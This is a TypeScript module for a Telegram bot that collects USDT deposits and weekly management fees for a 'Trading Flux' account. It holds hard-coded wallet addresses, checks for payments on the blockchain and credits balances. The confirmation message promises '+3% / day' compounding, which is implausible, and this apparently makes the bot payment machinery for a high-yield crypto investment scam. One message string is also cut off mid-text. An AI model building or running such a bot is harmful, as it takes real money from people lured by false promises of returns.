import { Bot, Context, InlineKeyboard } from "grammy";
import { Redis } from "@upstash/redis";
import { computeBalance } from "../utils/balance";

// ── Wallet config — edit these to change your receiving addresses ─────────────
const WALLET = {
  TRC20: {
    address: "TMqZgyf2wjfrXBudHk3p7uYYGP7D9PZvLt",
    label: "💜 USDT TRC20",
    network: "TRON (TRC20)",
    qrUrl: "https://i.8upload.com/image/0ecb47f67b15073b/download-2.png",
    fee: "~1 USDT",
  },
  ERC20: {
    address: "0xc2839F2Dd23B42C227DD91664fD0479659fC4610",
    label: "🔵 USDT ERC20",
    network: "Ethereum (ERC20)",
    qrUrl: "https://i.8upload.com/image/21fc625d9d174723/download-3.png",
    fee: "~5–15 USD gas",
  },
} as const;

const USDT_TRC20_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const USDT_ERC20_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const MIN_DEPOSIT = 10;
const WEEKLY_FEE = 3;

type Network = "TRC20" | "ERC20";

function r(): Redis {
  return new Redis({
    url: process.env.UPSTASH_REDIS_REST_URL!,
    token: process.env.UPSTASH_REDIS_REST_TOKEN!,
  });
}

// ── Redis state ───────────────────────────────────────────────────────────────
interface DepositStep {
  network: Network;
  type: "deposit" | "fee";
}

interface PendingDeposit {
  userId: number;
  network: Network;
  type: "deposit" | "fee";
  amount: number;
  baseAmount: number;
  timestamp: number;
}

async function setDepositStep(userId: number, step: DepositStep) {
  await r().set(`deposit_step:${userId}`, step, { ex: 600 });
}
async function getDepositStep(userId: number): Promise<DepositStep | null> {
  return r().get<DepositStep>(`deposit_step:${userId}`);
}
async function clearDepositStep(userId: number) {
  await r().del(`deposit_step:${userId}`);
}
async function savePending(p: PendingDeposit) {
  await r().set(`deposit:${p.userId}`, p, { ex: 3600 });
}
async function getPending(userId: number): Promise<PendingDeposit | null> {
  return r().get<PendingDeposit>(`deposit:${userId}`);
}
async function removePending(userId: number) {
  await r().del(`deposit:${userId}`);
}

function uniqueAmount(base: number): number {
  const cents = Math.floor(Math.random() * 89) + 10;
  return parseFloat((base + cents / 100).toFixed(2));
}

// ── Keyboards ─────────────────────────────────────────────────────────────────
function networkKeyboard(type: "deposit" | "fee") {
  return new InlineKeyboard()
    .text("💜 USDT TRC20", `dep_net_TRC20_${type}`).row()
    .text("🔵 USDT ERC20", `dep_net_ERC20_${type}`).row()
    .text("🔙 Back", "menu_main");
}

function addressKeyboard(network: Network, type: "deposit" | "fee") {
  return new InlineKeyboard()
    .text("📸 Show QR Code", `dep_qr_${network}_${type}`).row()
    .text("✅ I've Sent Payment", `dep_sent_${network}_${type}`).row()
    .text("🔙 Choose Network", type === "deposit" ? "menu_deposit" : "menu_fee");
}

// ── Shared senders ────────────────────────────────────────────────────────────
async function sendDepositMenu(ctx: Context, type: "deposit" | "fee", edit = false) {
  const isDeposit = type === "deposit";
  const text =
    `┌─────────────────────────┐\n` +
    `│  💰 ${isDeposit ? "DEPOSIT FUNDS" : "PAY MANAGEMENT FEE"}${isDeposit ? "      " : "   "}│\n` +
    `└─────────────────────────┘\n\n` +
    (isDeposit
      ? `Add funds to your Trading Flux account.\n\n📌 Minimum deposit: *$${MIN_DEPOSIT} USD*\n`
      : `Pay your weekly bot management fee.\n\n📌 Amount due: *$${WEEKLY_FEE} USDT*\n`) +
    `\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `🌐 Select your preferred network:\n\n` +
    `  💜 *TRC20* — Fast & low fees (~$1)\n` +
    `  🔵 *ERC20* — Higher gas fees (~$5–15)\n\n` +
    `_💡 TRC20 is recommended for most users._`;

  const opts = { parse_mode: "Markdown" as const, reply_markup: networkKeyboard(type) };
  if (edit) {
    try { await ctx.editMessageText(text, opts); return; } catch { /* fall through */ }
  }
  await ctx.reply(text, opts);
}

async function sendAddressPage(ctx: Context, network: Network, type: "deposit" | "fee") {
  const coin = WALLET[network];
  const isDeposit = type === "deposit";
  const amountLabel = isDeposit ? `Minimum $${MIN_DEPOSIT} USD` : `Exactly $${WEEKLY_FEE} USDT`;

  await ctx.reply(
    `┌─────────────────────────┐\n` +
    `│  ${coin.label} ${isDeposit ? "DEPOSIT" : "FEE PAYMENT"}           │\n` +
    `└─────────────────────────┘\n\n` +
    `📋 *Send to this address:*\n\n` +
    `\`${coin.address}\`\n\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `🌐 Network:    *${coin.network}*\n` +
    `💵 Amount:     *${amountLabel}*\n` +
    `⛽ Est. fee:   ${coin.fee}\n\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `⚠️ *Important:*\n` +
    `  • Send *only USDT* on the *${coin.network}* network\n` +
    `  • Sending wrong token = permanent loss\n` +
    `  • Tap QR code for easy scanning\n\n` +
    `After sending, tap ✅ *I've Sent Payment* below.`,
    { parse_mode: "Markdown", reply_markup: addressKeyboard(network, type) }
  );
}

// ── Blockchain checkers ───────────────────────────────────────────────────────
async function checkTRC20(p: PendingDeposit): Promise<{ found: boolean; txId?: string }> {
  const apiKey = process.env.TRONGRID_API_KEY ?? "";
  const url =
    `https://api.trongrid.io/v1/accounts/${WALLET.TRC20.address}/transactions/trc20` +
    `?only_to=true&contract_address=${USDT_TRC20_CONTRACT}&min_timestamp=${p.timestamp}&limit=50`;

  const res = await fetch(url, { headers: apiKey ? { "TRON-PRO-API-KEY": apiKey } : {} });
  const data: any = await res.json();
  const txs: any[] = data?.data ?? [];
  const match = txs.find((tx) => Math.abs(parseInt(tx.value ?? "0") / 1_000_000 - p.amount) < 0.005);
  return { found: !!match, txId: match?.transaction_id };
}

async function checkERC20(p: PendingDeposit): Promise<{ found: boolean; txId?: string }> {
  const apiKey = process.env.ETHERSCAN_API_KEY ?? "";
  const startTs = Math.floor(p.timestamp / 1000);
  const url =
    `https://api.etherscan.io/api?module=account&action=tokentx` +
    `&address=${WALLET.ERC20.address}` +
    `&contractaddress=${USDT_ERC20_CONTRACT}` +
    `&startblock=0&endblock=99999999&sort=desc&apikey=${apiKey}`;

  const res = await fetch(url);
  const data: any = await res.json();
  const txs: any[] = data?.result ?? [];
  const match = txs.find((tx) => {
    if (parseInt(tx.timeStamp ?? "0") < startTs) return false;
    return Math.abs(parseInt(tx.value ?? "0") / 1_000_000 - p.amount) < 0.005;
  });
  return { found: !!match, txId: match?.hash };
}

// ── Credit balance after confirmed payment ────────────────────────────────────
async function creditBalance(ctx: Context, pending: PendingDeposit, txId: string) {
  await removePending(pending.userId);

  const redis = r();
  const account = await redis.get<any>(`acct:${pending.userId}`);
  const now = new Date();
  let newDeposit: number;

  if (account && pending.type === "deposit") {
    const startDate = new Date(account.startDate as string);
    const daysElapsed = Math.max(0, Math.floor((now.getTime() - startDate.getTime()) / 86_400_000));
    const currentBalance = computeBalance(account.deposit, daysElapsed);
    newDeposit = parseFloat((currentBalance + pending.amount).toFixed(2));
    await redis.set(`acct:${pending.userId}`, {
      ...account,
      deposit: newDeposit,
      startDate: now.toISOString(),
    });
  } else {
    newDeposit = pending.amount;
  }

  try {
    await ctx.api.sendMessage(
      process.env.ADMIN_CHANNEL_ID!,
      `${pending.type === "deposit" ? "💰" : "💳"} <b>${pending.type === "deposit" ? "DEPOSIT" : "FEE PAYMENT"} AUTO-CONFIRMED</b>\n\n` +
      `👤 User ID: <code>${pending.userId}</code>\n` +
      `🌐 Network: <b>${pending.network}</b>\n` +
      `💵 Amount: <b>${pending.amount.toFixed(2)} USDT</b>\n` +
      `🔗 TX: <code>${txId}</code>\n` +
      (pending.type === "deposit" ? `💼 New Principal: <b>$${newDeposit.toFixed(2)}</b>` : `✅ Fee marked paid`),
      { parse_mode: "HTML" }
    );
  } catch { /* non-fatal */ }

  if (pending.type === "deposit") {
    await ctx.reply(
      `╔═══════════════════════════╗\n` +
      `║  ✅  DEPOSIT CONFIRMED!    ║\n` +
      `╚═══════════════════════════╝\n\n` +
      `🎉 *${pending.amount.toFixed(2)} USDT* has been credited!\n\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `💰 *New Balance:* $${newDeposit.toFixed(2)}\n` +
      `📅 Compounding restarted from today\n` +
      `📈 Rate: *+3% / day*\n\n` +
      `🔗 TX: \`${txId}\``,
      { parse_mode: "Markdown", reply_markup: new InlineKeyboard().text("📊 View Dashboard", "menu_balance").row().text("🏠 Main Menu", "menu_main") }
    );
  } else {
    await ctx.reply(
      `╔═══════════════════════════╗\n` +
      `║  ✅  FEE PAYMENT CONFIRMED ║\n` +
      `╚═══════════════════════════╝\n\n` +
      `🎉 *$${pending.amount.toFixed(2)} USDT* fee payment received!\n\n` +
      `✅ Account management fee paid for this week.\n\n` +
      `🔗 TX: \`${txId}\``,
      { parse_mode: "Markdown", reply_markup: new InlineKeyboard().text("🏠 Main Menu", "menu_main") }
    );
  }
}

// ── Text input handler (called by form.ts) ────────────────────────────────────
export async function handleDepositTextInput(ctx: Context): Promise<boolean> {
  const userId = ctx.from!.id;
  const step = await getDepositStep(userId);
  if (!step) return false;

  const text = (ctx.message as any)?.text?.trim() ?? "";
  if (!text || text.startsWith("/")) return false;

  const isDeposit = step.type === "deposit";
  const amount = parseFloat(text.replace(/[^0-9.]/g, ""));

  if (isNaN(amount) || amount <= 0) {
    await ctx.reply(`⚠️ *Invalid amount.* Enter a number (e.g. \`50\`):`, { parse_mode: "Markdown" });
    return true;
  }
  if (isDeposit && amount < MIN_DEPOSIT) {
    await ctx.reply(
      `⚠️ *Minimum deposit is $${MIN_DEPOSIT} USDT.*\n\nYou entered $${amount}. Please enter a higher amount:`,
      { parse_mode: "Markdown" }
    );
    return true;
  }

  await clearDepositStep(userId);

  const exactAmount = isDeposit ? uniqueAmount(amount) : WEEKLY_FEE;
  const pending: PendingDeposit = {
    userId, network: step.network, type: step.type,
    amount: exactAmount, baseAmount: amount, timestamp: Date.now(),
  };
  await savePending(pending);

  const coin = WALLET[step.network];

  await ctx.reply(
    `┌─────────────────────────┐\n` +
    `│  💳  SEND EXACT AMOUNT   │\n` +
    `└─────────────────────────┘\n\n` +
    `To auto-detect your payment, send *exactly*:\n\n` +
    `┌─────────────────────────┐\n` +
    `│  💵  *${exactAmount.toFixed(2)} USDT*              │\n` +
    `└─────────────────────────┘\n\n` +
    `📬 *To:* \`${coin.address}\`\n` +
    `🌐 *Network:* ${coin.network}\n\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `⚠️ Send the *exact amount* shown above.\n` +
    `The unique cents help us identify your payment.\n\n` +
    `⏱ Payment expires in *60`,
    {
      parse_mode: "Markdown",
      reply_markup: new InlineKeyboard()
        .text("✅ I've Sent It — Check Now", "deposit_check").row()
        .text("❌ Cancel", "dep_cancel"),
    }
  );
  return true;
}

// ── Check payment callback ────────────────────────────────────────────────────
async function handleCheckPayment(ctx: Context) {
  const userId = ctx.from!.id;
  const pending = await getPending(userId);

  if (!pending) {
    await ctx.reply(
      `⚠️ No pending payment found. It may have expired (60 min limit).`,
      { reply_markup: new InlineKeyboard().text("💰 New Deposit", "menu_deposit").row().text("🏠 Main Menu", "menu_main") }
    );
    return;
  }

  await ctx.reply("🔍 *Checking blockchain...*\n\n⏳ Please wait a moment.", { parse_mode: "Markdown" });

  let result: { found: boolean; txId?: string };
  try {
    result = pending.network === "TRC20" ? await checkTRC20(pending) : await checkERC20(pending);
  } catch {
    await ctx.reply(`⚠️ Network error while checking. Please try again.`, {
      reply_markup: new InlineKeyboard().text("🔄 Try Again", "deposit_check").row().text("🏠 Main Menu", "menu_main"),
    });
    return;
  }

  if (!result.found) {
    await ctx.reply(
      `⏳ *Payment Not Detected Yet*\n\n` +
      `We couldn't find your transaction on-chain yet.\n\n` +
      `*${WALLET[pending.network].network}:* ` +
      (pending.network === "TRC20" ? "Usually confirms in 1–3 minutes." : "Usually confirms in 2–5 minutes.") +
      `\n\nMake sure you sent *exactly ${pending.amount.toFixed(2)} USDT*.\n\n` +
      `📬 To: \`${WALLET[pending.network].address}\``,
      {
        parse_mode: "Markdown",
        reply_markup: new InlineKeyboard()
          .text("🔄 Check Again", "deposit_check").row()
          .text("❌ Cancel", "dep_cancel"),
      }
    );
    return;
  }

  await creditBalance(ctx, pending, result.txId!);
}

// ── Register all handlers ─────────────────────────────────────────────────────
export function registerDepositHandlers(bot: Bot<Context>): void {

  bot.command("deposit", async (ctx) => { await sendDepositMenu(ctx, "deposit"); });

  bot.callbackQuery("menu_deposit", async (ctx) => {
    await ctx.answerCallbackQuery();
    await sendDepositMenu(ctx, "deposit");
  });

  bot.callbackQuery("menu_fee", async (ctx) => {
    await ctx.answerCallbackQuery();
    await sendDepositMenu(ctx, "fee");
  });

  bot.callbackQuery(/^dep_net_(TRC20|ERC20)_(deposit|fee)$/, async (ctx) => {
    await ctx.answerCallbackQuery();
    const [, network, type] = ctx.match as RegExpMatchArray;
    await setDepositStep(ctx.from!.id, { network: network as Network, type: type as "deposit" | "fee" });
    await sendAddressPage(ctx, network as Network, type as "deposit" | "fee");
  });

  bot.callbackQuery(/^dep_qr_(TRC20|ERC20)_(deposit|fee)$/, async (ctx) => {
    await ctx.answerCallbackQuery("Loading QR code...");
    const [, network, type] = ctx.match as RegExpMatchArray;
    const coin = WALLET[network as Network];
    const isDeposit = type === "deposit";
    await ctx.replyWithPhoto(coin.qrUrl, {
      caption:
        `📸 *${coin.label} QR Code*\n\n` +
        `Scan with your wallet to get the address.\n\n` +
        `🌐 Network: *${coin.network}*\n` +
        `💵 ${isDeposit ? `Minimum: *$${MIN_DEPOSIT} USDT*` : `Amount: *$${WEEKLY_FEE} USDT*`}\n\n` +
        `Or copy manually:\n\`${coin.address}\``,
      parse_mode: "Markdown",
      reply_markup: new InlineKeyboard()
        .text("✅ I've Sent Payment", `dep_sent_${network}_${type}`).row()
        .text("🔙 Back to Address", `dep_net_${network}_${type}`),
    });
  });

  bot.callbackQuery(/^dep_sent_(TRC20|ERC20)_(deposit|fee)$/, async (ctx) => {
    await ctx.answerCallbackQuery();
    const [, network, type] = ctx.match as RegExpMatchArray;
    const isDeposit = type === "deposit";
    await setDepositStep(ctx.from!.id, { network: network as Network, type: type as "deposit" | "fee" });
    await ctx.reply(
      `💬 *How much did you send?*\n\n` +
      `Enter the exact USDT amount you sent:\n` +
      `_e.g._ \`${isDeposit ? "50" : "3"}\`\n\n` +
      `${isDeposit ? `📌 Minimum: *$${MIN_DEPOSIT} USDT*` : `📌 Fee amount: *$${WEEKLY_FEE} USDT*`}`,
      { parse_mode: "Markdown", reply_markup: new InlineKeyboard().text("❌ Cancel", "dep_cancel") }
    );
  });

  bot.callbackQuery("deposit_check", async (ctx) => {
    await ctx.answerCallbackQuery();
    await handleCheckPayment(ctx);
  });

  bot.callbackQuery("dep_cancel", async (ctx) => {
    await ctx.answerCallbackQuery("Cancelled");
    await clearDepositStep(ctx.from!.id);
    await removePending(ctx.from!.id);
    await ctx.reply(
      `❌ *Payment cancelled.*\n\nNo submission was made.`,
      {
        parse_mode: "Markdown",
        reply_markup: new InlineKeyboard()
          .text("💰 Try Again", "menu_deposit").row()
          .text("🏠 Main Menu", "menu_main"),
      }
    );
  });
}
